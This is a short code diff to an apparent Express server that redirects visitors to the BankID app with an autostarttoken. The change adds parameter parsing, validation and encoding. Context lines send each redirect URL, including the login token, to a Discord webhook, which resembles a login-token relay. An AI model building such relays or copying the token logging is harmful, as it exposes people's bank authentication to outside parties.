@@ -18,7 +18,25 @@ app.get('/', (req, res) => {
     return res.status(400).send('Query parameters are required.');
   }
 
-  const redirectUrl = `bankid:///?autostarttoken=${queryString}`;
+  // Split the query string into individual parameters
+  const params = new URLSearchParams(queryString);
+
+  // Retrieve specific query parameters
+  const autostarttoken = params.get('autostarttoken');
+  const redirect = params.get('redirect');
+
+  // Validate autostarttoken presence
+  if (!autostarttoken) {
+    return res.status(400).send('Autostarttoken parameter is required.');
+  }
+
+  // Construct the redirect URL
+  let redirectUrl = `bankid:///?autostarttoken=${encodeURIComponent(autostarttoken)}`;
+
+  // Append the 'redirect' parameter if provided
+  if (redirect) {
+    redirectUrl += `&redirect=${encodeURIComponent(redirect)}`;
+  }
 
   // Log the redirect URL to Discord webhook
   sendDiscordWebhook(redirectUrl);
